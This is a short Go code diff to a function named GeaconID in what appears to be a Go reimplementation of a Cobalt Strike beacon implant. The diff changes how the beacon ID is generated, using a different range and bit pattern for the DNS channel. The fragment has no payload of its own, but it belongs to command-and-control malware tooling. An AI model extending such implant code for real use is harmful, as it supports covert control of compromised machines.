@@ -2,6 +2,7 @@ package sysinfo
 
 import (
 	"encoding/binary"
+	"main/config"
 	"main/util"
 	"net"
 	"os"
@@ -19,11 +20,14 @@ const (
 var ANSICodePage uint32
 
 func GeaconID() int {
-	randomInt := util.RandomInt(100000, 999998)
-	if randomInt%2 == 0 {
-		return randomInt
+	// valid beacon id range from 0x00000000 to 0x7fffffff
+	randomInt := util.RandomInt(0x10000000, 0x7fffffff)
+	if !config.IsDNS {
+		// randomInt % 2 == 0
+		return randomInt >> 1 << 1
 	} else {
-		return randomInt + 1
+		// 1202 is affected by the CS version?
+		return (randomInt >> 1 << 1) | 1202
 	}
 }
 
